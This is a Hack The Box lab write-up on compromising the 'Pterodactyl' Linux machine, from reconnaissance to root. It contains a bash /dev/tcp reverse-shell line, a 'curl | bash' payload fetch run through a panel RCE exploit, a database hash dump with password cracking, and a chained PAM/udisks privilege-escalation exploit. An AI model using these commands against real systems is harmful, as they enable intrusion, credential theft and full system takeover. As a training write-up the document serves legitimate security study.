---
title: Pterodactyl
type: writeup
category: linux
platform: HTB
difficulty: Medium
os: Linux
date: 2026-04-19
tags:
  - CVE-2025-49132
  - CVE-2025-6018
  - CVE-2025-6019
  - Pterodactyl
summary: Full lab walkthrough from recon to root with exploit chain and practical troubleshooting notes.
initialAccess: RCE on Pterodactyl panel via CVE-2025-49132 (PHP PEAR deserialization).
privesc: Chained CVE-2025-6018 and CVE-2025-6019 to execute SUID bash and get root.
---

# Pterodactyl

Ok, first as we do every time, let's start with the Nmap scan.

```bash
❯ sudo nmap -Pn 10.129.26.208 -sCV -o scan.txt
Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-05 09:52 +0200
Nmap scan report for 10.129.26.208
Host is up (0.24s latency).
Not shown: 971 filtered tcp ports (no-response), 25 filtered tcp ports (admin-prohibited)
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 9.6 (protocol 2.0)
| ssh-hostkey: 
|   256 a3:74:1e:a3:ad:02:14:01:00:e6:ab:b4:18:84:16:e0 (ECDSA)
|_  256 65:c8:33:17:7a:d6:52:3d:63:c3:e4:a9:60:64:2d:cc (ED25519)
80/tcp   open   http       nginx 1.21.5
|_http-title: Did not follow redirect to http://pterodactyl.htb/
|_http-server-header: nginx/1.21.5
443/tcp  closed https
8080/tcp closed http-proxy

Nmap done: 1 IP address (1 host up) scanned in 39.58 seconds
```

Not that much, but let's see what's on the web.

![image.png](image.png)

There's a new subdomain — clicking through it just redirects to `pterodactyl.htb`. Then I hit the **CHANGELOGS** button:

![image.png](image%201.png)

Panel version **v1.11.10** is visible. Added it to `/etc/hosts` and opened it up.

![image.png](image%202.png)

Searched for exploits for this version and found one on Exploit-DB: [https://www.exploit-db.com/exploits/52341](https://www.exploit-db.com/exploits/52341)

Let's use it.

![image.png](image%203.png)

```bash
❯ python3 52341.py http://panel.pterodactyl.htb/
http://panel.pterodactyl.htb/ => pterodactyl:PteraPanel@127.0.0.1:3306/panel
```

Database credentials — Username: `pterodactyl`, Password: `PteraPanel`.

Also found a GitHub exploit for RCE: [https://github.com/rippsec/CVE-2025-49132-PHP-PEAR](https://github.com/rippsec/CVE-2025-49132-PHP-PEAR)

![image.png](image%204.png)

Vulnerability confirmed. Let's abuse it.

![image.png](image%205.png)


Getting the reverse shell ready:

```bash
❯ echo 'bash -i >& /dev/tcp/10.10.17.212/4444 0>&1' > shell.sh
-----------------------------------------------------------
❯ cat shell.sh
bash -i >& /dev/tcp/10.10.17.212/4444 0>&1
-----------------------------------------------------------
❯ python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 ...
10.129.26.208 - - [05/Apr/2026 12:30:57] "GET /shell.sh HTTP/1.1" 200 -
```

```bash
nc -lnvp 4444
```

```bash
❯ python3 poc.py -H panel.pterodactyl.htb -c "curl http://10.10.17.212:8080/shell.sh | bash"
[CVE-2025-49132] Pterodactyl Panel RCE via PHP PEAR
/ [!] Unexpected error: timed out
```

![image.png](image%206.png)

![image.png](image%207.png)

Ok ok, let's start cooking. We already have MariaDB credentials from earlier, so let's use them.

![image.png](image%208.png)

```bash
wwwrun@pterodactyl:/var/www/pterodactyl/public> /usr/bin/mariadb -h 127.0.0.1 -u pterodactyl -p'PteraPanel' panel

MariaDB [panel]> select * from users;
+----+-------------+------------------+--------------+------------------------------+------------+-----------+--------------------------------------------------------------+----------+------------+
| id | external_id | uuid             | username     | email                        | name_first | name_last | password                                                     | language | root_admin |
+----+-------------+------------------+--------------+------------------------------+------------+-----------+--------------------------------------------------------------+----------+------------+
|  2 | NULL        | 5e6d956e-...     | headmonitor  | headmonitor@pterodactyl.htb  | Head       | Monitor   | $2y$10$3WJht3/5GOQmOXdljPbAJet2C6tHP4QoORy1PSj59qJrU0gdX5gD2 | en       |          1 |
|  3 | NULL        | ac7ba5c2-...     | phileasfogg3 | phileasfogg3@pterodactyl.htb | Phileas    | Fogg      | $2y$10$PwO0TBZA8hLB6nuSsxRqoOuXuGi3I4AVVN2IgE7mZJLzky1vGC9Pi | en       |          0 |
+----+-------------+------------------+--------------+------------------------------+------------+-----------+--------------------------------------------------------------+----------+------------+
```

`headmonitor` is `root_admin`. Let's crack both hashes.

![image.png](image%209.png)

The cracked password belonged to `phileasfogg3`:

```bash
❯ john hashed.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt
!QAZ2wsx         (?)

❯ ssh phileasfogg3@pterodactyl.htb
(phileasfogg3@pterodactyl.htb) Password: 
Have a lot of fun...
phileasfogg3@pterodactyl:~> whoami
phileasfogg3
```

Time for some OS enumeration.

```bash
phileasfogg3@pterodactyl:~> cat /etc/os-release
NAME="openSUSE Leap"
VERSION="15.6"
```

---

## Privilege Escalation

Checking the mail spool:

```bash
phileasfogg3@pterodactyl:/var/mail> cat phileasfogg3

Subject: SECURITY NOTICE — Unusual udisksd activity (stay alert)

Attention all users,
Unusual activity has been observed from the udisks daemon (udisksd).
Do not connect untrusted external media. Review your sessions for suspicious activity.
Administrators should review udisks and system logs and apply pending updates.

— HeadMonitor, System Administrator
```

The admin is hinting at something with `udisks`. A quick search led to this: [https://success.qualys.com/discussions/s/article/000008043](https://success.qualys.com/discussions/s/article/000008043)

It chains two vulnerabilities together — **CVE-2025-6018 + CVE-2025-6019**.

To clarify quickly: `polkit` is the system responsible for controlling permissions for disk and mount operations on Linux. When a user triggers certain actions, polkit classifies the session into one of three levels:

| **allow_active** | User is physically at the machine (console or GUI) | Highest privilege |
| **allow_inactive** | Local user but not active | Mid-level |
| **allow_any** | Any session — including remote (SSH, VNC) | Lowest privilege |

```
CVE-2025-6019 – libblockdev / udisks LPE

Exploitable by "allow_active" users.
Allows mounting malicious images with improper security flags (nosuid, nodev) to gain full root privileges.
```

We can chain both CVEs to get a root shell ;) 

Cloning the exploit:[https://github.com/DesertDemons/CVE-2025-6018-6019.git](https://github.com/DesertDemons/CVE-2025-6018-6019.git)

```bash
git clone https://github.com/DesertDemons/CVE-2025-6018-6019.git
```

Hosting it and pulling it to the victim:

```bash
curl http://my_ip:port/exploit.sh -o exploit.sh
```

Checking for vulnerabilities:

```bash
phileasfogg3@pterodactyl:~> ./exploit.sh --check

[*] Running full vulnerability check...
[+] All dependencies found
[+] pam_env.so found in PAM configuration
[+] pam_systemd.so found - escalation vector available
[*] Detected OS: openSUSE Leap 15.6
[+] Target OS is vulnerable (openSUSE/SLES)
[+] udisksctl found
[+] Polkit rules allow drive-mount/filesystem-mount
[!] CVE-2025-6018: VULNERABLE
[!] CVE-2025-6019: VULNERABLE
[!] EXPLOIT CHAIN: POSSIBLE
```

Vulnerable. Let's go.

```bash
phileasfogg3@pterodactyl:~> ./exploit.sh --exploit

[*] Starting exploit chain...
[*] Step 1: Triggering CVE-2025-6018 (PAM Injection)...
[+] Successfully injected into ~/.pam_environment
[+] New session is ACTIVE (Active=yes)
[*] Step 2: Triggering CVE-2025-6019 (udisks2 Race Condition)...
[*] Creating malicious XFS image...
[+] Mount successful!
[+] Success! Root shell spawned.

root@pterodactyl:/# whoami
root
root@pterodactyl:/# cat /root/root.txt
```

![image.png](image%2010.png)

![image.png](image%2011.png)

And we are **root** ;)

> What I learned from this lab: don't give up. It was more mental than technical — always keep going on something you love.